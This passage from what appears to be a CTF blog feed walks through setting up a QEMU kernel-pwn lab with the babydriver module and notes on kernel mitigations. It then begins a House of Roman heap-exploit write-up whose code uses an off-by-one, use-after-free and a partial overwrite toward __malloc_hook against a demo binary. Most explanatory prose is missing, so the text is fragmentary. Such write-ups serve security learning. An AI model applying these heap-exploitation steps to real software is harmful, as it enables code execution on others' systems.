etc/init.d</span><br></pre></td></tr></table></figure><p>init  chmod +x init </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc    </span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p></p><p>pack.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo cp -r rootfs rootfs_tmp</span><br><span class="line">sudo cp init rootfs_tmp/</span><br><span class="line">sudo cp babydriver.ko rootfs_tmp/</span><br><span class="line"></span><br><span class="line">sudo chmod +x rootfs_tmp/</span><br><span class="line">sudo chmod g-w -R rootfs_tmp/</span><br><span class="line">sudo chmod o-w -R rootfs_tmp/</span><br><span class="line">sudo chown -R root rootfs_tmp/</span><br><span class="line">sudo chgrp -R root rootfs_tmp/</span><br><span class="line">sudo chmod u+s rootfs_tmp/bin/busybox</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp</span><br><span class="line">sudo mkdir -p  proc sys dev etc/init.d</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line">cd ../</span><br><span class="line">sudo rm -rf ./rootfs_tmp</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><p><a href="https://cdn.kernel.org/pub/linux/kernel/">https://cdn.kernel.org/pub/linux/kernel/</a></p><p><a href="https://blog.csdn.net/SweeNeil/article/details/88655995">kernel</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make help</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make -j4 bzImage</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ARCH= CROSS_COMPILE=  make -j4 bzImage</span><br></pre></td></tr></table></figure><p>bzImage</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; file ./bzImage</span><br><span class="line">./bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0X6, Normal VGA</span><br></pre></td></tr></table></figure><p><a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz">https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz</a></p><p>gcc,</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/kernel-env&gt; strings ./bzImage | grep &#x27;gcc&#x27;</span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt; make menuconfig</span><br><span class="line">  HOSTCC  scripts/kconfig/mconf.o</span><br><span class="line">In file included from scripts/kconfig/mconf.c:23:0:</span><br><span class="line">scripts/kconfig/lxdialog/dialog.h:38:20: fatal error: curses.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:108: recipe for target &#x27;scripts/kconfig/mconf.o&#x27; failed</span><br><span class="line">make[1]: *** [scripts/kconfig/mconf.o] Error 1</span><br><span class="line">Makefile:542: recipe for target &#x27;menuconfig&#x27; failed</span><br><span class="line">make: *** [menuconfig] Error 2</span><br><span class="line"></span><br><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scripts/sign-file.c:23:30: fatal error: openssl/opensslv.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">scripts/Makefile.host:91: recipe for target &#x27;scripts/sign-file&#x27; failed</span><br><span class="line">make[1]: *** [scripts/sign-file] Error 1</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line">  HOSTCC  arch/x86/tools/relocs_common.o</span><br><span class="line">  HOSTLD  arch/x86/tools/relocs</span><br><span class="line">Makefile:556: recipe for target &#x27;scripts&#x27; failed</span><br><span class="line">make: *** [scripts] Error 2</span><br><span class="line">make: *** Waiting for unfinished jobs....</span><br><span class="line"></span><br><span class="line">grxer@Ubuntu16 /m/h/s/k/linux-4.4.42&gt;  sudo apt-get install libssl-dev </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setup is 17404 bytes (padded to 17408 bytes).</span><br><span class="line">System is 6820 kB</span><br><span class="line">CRC df8a19f</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><p></p><ul><li>bzImage<code>arch/x86/boot/bzImage</code></li><li>vmlinux</li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt search linux-image- </span><br><span class="line">sudo apt download xxxxx</span><br><span class="line">dpkg -X xxxx extract</span><br><span class="line">./boot/xxx-genericbzImage</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&#x2F;boot&#x2F;</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ll -a /boot</span><br><span class="line">total 177M</span><br><span class="line">drwxr-xr-x  4 root root 4.0K  7 12 09:06 .</span><br><span class="line">drwxr-xr-x 20 root root 4.0K  7 28 15:44 ..</span><br><span class="line">-rw-r--r--  1 root root 264K  6  7 22:23 config-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 264K  6 21 22:38 config-5.19.0-46-generic</span><br><span class="line">drwx------  3 root root 4.0K  1  1  1970 efi</span><br><span class="line">drwxr-xr-x  6 root root 4.0K  7 12 09:05 grub</span><br><span class="line">lrwxrwxrwx  1 root root   28  7 12 09:03 initrd.img -&gt; initrd.img-5.19.0-46-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7 12 09:04 initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root  70M  7 12 09:04 initrd.img-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   28  7 12 09:03 initrd.img.old -&gt; initrd.img-5.19.0-45-generic</span><br><span class="line">-rw-r--r--  1 root root 179K  2  7  2022 memtest86+.bin</span><br><span class="line">-rw-r--r--  1 root root 181K  2  7  2022 memtest86+.elf</span><br><span class="line">-rw-r--r--  1 root root 181K  2  7  2022 memtest86+_multiboot.bin</span><br><span class="line">-rw-------  1 root root 6.2M  6  7 22:23 System.map-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root 6.2M  6 21 22:38 System.map-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7 12 09:03 vmlinuz -&gt; vmlinuz-5.19.0-46-generic</span><br><span class="line">-rw-------  1 root root  12M  6  7 22:23 vmlinuz-5.19.0-45-generic</span><br><span class="line">-rw-------  1 root root  12M  6 21 22:43 vmlinuz-5.19.0-46-generic</span><br><span class="line">lrwxrwxrwx  1 root root   25  7 12 09:03 vmlinuz.old -&gt; vmlinuz-5.19.0-45-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; <span class="built_in">uname</span> -r</span><br><span class="line">5.19.0-46-generic</span><br><span class="line">grxer@Ubuntu22 ~&gt; sudo file /boot/vmlinuz-5.19.0-46-generic</span><br><span class="line">[sudo] password <span class="keyword">for</span> grxer:</span><br><span class="line">/boot//vmlinuz-5.19.0-46-generic: Linux kernel x86 boot executable bzImage, version 5.19.0-46-generic (buildd@lcy02-amd64-025) <span class="comment">#47~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 21 15:35:31 UTC 2, RO-rootFS, swap_dev 0XB, Normal VGA</span></span><br></pre></td></tr></table></figure><p>vmlinuz-5.19.0-46-generic </p><p>initrd.img-5.19.0-46-generic </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>start.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">64</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><ul><li><code>-m</code></li><li><code>-nographic</code></li><li><code>-kernel</code></li><li><code>initrd</code>RAM</li><li><code>append</code></li><li><code>smp</code>: 2  1 </li><li><code>cpu</code>:CPU</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>aslr</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  -gdb dev-gdb tcp::1234 -s  qemu -S</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ # lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">~ # find /sys/| grep babydriver</span><br><span class="line">/sys/module/babydriver</span><br><span class="line">/sys/module/babydriver/srcversion</span><br><span class="line">/sys/module/babydriver/notes</span><br><span class="line">/sys/module/babydriver/notes/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/taint</span><br><span class="line">/sys/module/babydriver/initstate</span><br><span class="line">/sys/module/babydriver/coresize</span><br><span class="line">/sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections/.bss</span><br><span class="line">/sys/module/babydriver/sections/.init.text</span><br><span class="line">/sys/module/babydriver/sections/.data</span><br><span class="line">/sys/module/babydriver/sections/.text</span><br><span class="line">/sys/module/babydriver/sections/__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections/.strtab</span><br><span class="line">/sys/module/babydriver/sections/.symtab</span><br><span class="line">/sys/module/babydriver/sections/.gnu.linkonce.this_module</span><br><span class="line">/sys/module/babydriver/sections/.rodata.str1.1</span><br><span class="line">/sys/module/babydriver/sections/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/sections/.exit.text</span><br><span class="line">/sys/module/babydriver/refcnt</span><br><span class="line">/sys/module/babydriver/uevent</span><br><span class="line">/sys/module/babydriver/holders</span><br><span class="line">/sys/module/babydriver/initsize</span><br><span class="line">~ # cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.bss</span><br><span class="line">0xffffffffc0002440</span><br><span class="line">~ $ cat /sys/module/babydriver/sections/.data</span><br><span class="line">0xffffffffc0002000</span><br></pre></td></tr></table></figure><p>gdb.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file babydriver.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002440&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b babyopen&quot; </span><br></pre></td></tr></table></figure><h2 id="Loadable-Kernel-ModulesLKMs"><a href="#Loadable-Kernel-ModulesLKMs" class="headerlink" title="Loadable Kernel ModulesLKMs"></a>Loadable Kernel ModulesLKMs</h2><p>Linux Kernle<strong></strong><strong>Loadable Kernel Modules</strong><strong>LKMs</strong>LKMs<strong></strong>LKMsELF</p><ul><li><code>lsmod</code>LKMs</li><li><code>insmod</code>LKMroot</li><li><code>rmmod</code>LKMroot</li><li><code>modprobe</code>: modprobe </li></ul><p>ctf</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir testdrive &amp; cd testdrive</span><br></pre></td></tr></table></figure><p>kotest.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123; printk(<span class="string">&quot;Bye Bye~\n&quot;</span>); &#125;</span><br><span class="line">module_init(ko_test_init);<span class="comment">// </span></span><br><span class="line">module_exit(ko_test_exit);<span class="comment">// </span></span><br></pre></td></tr></table></figure><p>Makefile</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += ko_test.o</span><br><span class="line"></span><br><span class="line">KDIR =/home/grxer/kernel-env/linux-4.4.72/</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure><ul><li><code>obj-m</code> </li><li><code>KDIR</code> </li><li><code>-C</code> </li><li><code>M</code>  Makefile   </li></ul><p>make</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; make</span><br><span class="line">make -C /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/ M=/home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive modules</span><br><span class="line">make[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">  CC [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.o</span><br><span class="line">  Building modules, stage <span class="number">2.</span></span><br><span class="line">  MODPOST <span class="number">1</span> modules</span><br><span class="line">  CC      /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.mod.o</span><br><span class="line">  LD [M]  /home/grxer/kernel-env/linux<span class="number">-4.4</span><span class="number">.72</span>/testdrive/ko_test.ko</span><br><span class="line">make[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/grxer/kernel-env/linux-4.4.72&#x27;</span></span><br><span class="line">grxer@Ubuntu16 ~/k/l/testdrive&gt; ls</span><br><span class="line">ko_test.c*  ko_test.mod.c  ko_test.o  modules.order</span><br><span class="line">ko_test.ko  ko_test.mod.o  Makefile*  Module.symvers</span><br></pre></td></tr></table></figure><blockquote><p>gccgcc</p></blockquote><p>ko_test.koinitLKM</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /ko_test.ko</span><br></pre></td></tr></table></figure><p>dmesg</p><p><img src="/2023/08/08/first-kernelpwn/image-20230814231519956.png" alt="image-20230814231519956"></p><h3 id=""><a href="#" class="headerlink" title=""></a><a href="https://www.cnblogs.com/ggzhangxiaochao/p/12894883.html"></a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">misc_register</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">misc_deregister</span><span class="params">(<span class="keyword">struct</span> miscdevice *misc)</span></span><br></pre></td></tr></table></figure><p>misc_register10,mknodmisc_register()class_device_creatdevice_creat().</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>  &#123;</span></span><br><span class="line">    <span class="type">int</span> minor;<span class="comment">//, MISC_DYNAMIC_MINOR </span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;<span class="comment">//</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>;</span><span class="comment">//</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">class_device</span> *<span class="keyword">class</span>;</span></span><br><span class="line">    <span class="type">char</span> devfs_name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/fs.h#L1821">file_operations</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">misc_ioctl</span><span class="params">(<span class="keyword">struct</span> file* file, <span class="type">unsigned</span> <span class="type">int</span> request,  <span class="type">size_t</span> arg)</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (request)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x666</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x666\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x888</span>:</span><br><span class="line">    printk(<span class="string">&quot;0x888\n&quot;</span>); </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">dev_fops</span> =</span> &#123;</span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .unlocked_ioctl = misc_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">test_misc</span> =</span> &#123;</span><br><span class="line">  .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">  .name = <span class="string">&quot;testmisc&quot;</span>,</span><br><span class="line">  .fops = &amp;dev_fops,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ko_test_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;This is a test ko!\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> err = misc_register(&amp;test_misc);</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    printk(<span class="string">&quot;envctrl: Unable to get misc minor %d/n&quot;</span>,test_misc.minor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ko_test_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  printk(<span class="string">&quot;Bye Bye~\n&quot;</span>);</span><br><span class="line">  misc_deregister(&amp;test_misc);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure><p><strong>ioctl</strong></p><blockquote><p>32APP64kernel<strong>compat_ioctl</strong></p><p>6464kernel<strong>unlocked_ioctl</strong>32APP32kernel<strong>unlocked_ioctl</strong></p></blockquote><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> fd=open(<span class="string">&quot;/dev/testmisc&quot;</span>,O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(<span class="number">-1</span>==fd)&#123;</span><br><span class="line">    perror(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res=ioctl(fd, <span class="number">0x666</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">  res=ioctl(fd, <span class="number">0x888</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;res:%d\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p>kernel address space layout randomize </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemusmep -append kaslr</span><br><span class="line">       -append nokaslr</span><br></pre></td></tr></table></figure><h3 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h3><p>FGKASLR KASLR</p><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p> canary,x86  Canary  task  Canary</p><p> canary  gs </p><h3 id="SMEP-x2F-SMAP"><a href="#SMEP-x2F-SMAP" class="headerlink" title="SMEP&#x2F;SMAP"></a>SMEP&#x2F;SMAP</h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811154518221.png" alt="image-20230811154518221"></p><p>Supervisor Mode <strong>Execution</strong> Protection  </p><p>ARMPXN</p><p>CR4<strong>20</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemusmep     -cpu qemu64-v1,smep</span><br></pre></td></tr></table></figure><p>Supervisor Mode <strong>Access</strong> Prevention  </p><p>ARMPAN</p><p>CR4<strong>21</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemusmep     -cpu qemu64-v1,smap</span><br></pre></td></tr></table></figure><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a><a href="https://zhuanlan.zhihu.com/p/137277724">KPTI</a></h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811165305116.png" alt="image-20230811165305116"></p><p>Kernel Page Table Isolation <strong></strong></p><p>KPTIMeltdown</p><ul><li> x86_64  PTI </li><li></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemusmep -append kpti=1</span><br><span class="line">       -append nopti</span><br></pre></td></tr></table></figure><p>Linux 4.15  KPTI  Linux 4.14.114.9.754.4.110</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h4><p><code>/proc/sys/kernel/dmesg_restrict</code></p><p> <code>dmesg</code>  </p><ul><li>0 </li><li>1  <code>CAP_SYSLOG</code>  <code>dmesg</code> </li></ul><h4 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h4><p> <code>/proc/sys/kernel/kptr_restrict</code></p><p>,&#x2F;proc</p><ul><li>0</li><li>1 <code>pK</code>  0 CAP_SYSLOG  group id  id </li><li>2 <code>pK</code>  0 </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Roman</title>
      <link href="/2023/08/06/House-Of-Roman/"/>
      <url>/2023/08/06/House-Of-Roman/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack  Unsortbin attack bypass ALSR 12-bit uafoff by one<strong> </strong></p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/c/p/h/House-Of-Roman&gt; checksec ./new_chall </span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/House-Of-Roman/new_chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>write_chunkoff by one</p><p>free_chunkuaf  double free</p><p></p><ul><li><p>unsortedbin attach malloc_hookunsortedbin</p></li><li><p>fastbin attachmalloc_hook12bitmalloc_hookunsortedbinogg</p></li></ul><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) # <span class="number">0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) # d0</span><br><span class="line"><span class="title function_">create</span><span class="params">(<span class="number">0x68</span>,<span class="number">2</span>)</span>  # 0x70</span><br><span class="line"></span><br><span class="line">fake = b<span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  #<span class="meta"># fake size</span></span><br></pre></td></tr></table></figure><p>chunk1+0x78size0x71fastbinattach</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807144531230.png" alt="image-20230807144531230"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)unsortbin</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807144800100.png" alt="image-20230807144800100"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x68,3)  # b</span><br><span class="line">create(0x68,15)</span><br><span class="line">create(0x68,18)</span><br><span class="line">over = b&quot;A&quot;*0x18  # off by one</span><br><span class="line">over += b&quot;\x71&quot;  # set chunk  1&#x27;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">heap_po = b&quot;\x20&quot;</span><br><span class="line"># b()</span><br><span class="line">edit(3,heap_po)</span><br></pre></td></tr></table></figure><p>off by oneuafchunk1fastbin</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145444749.png" alt="image-20230807145444749"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight 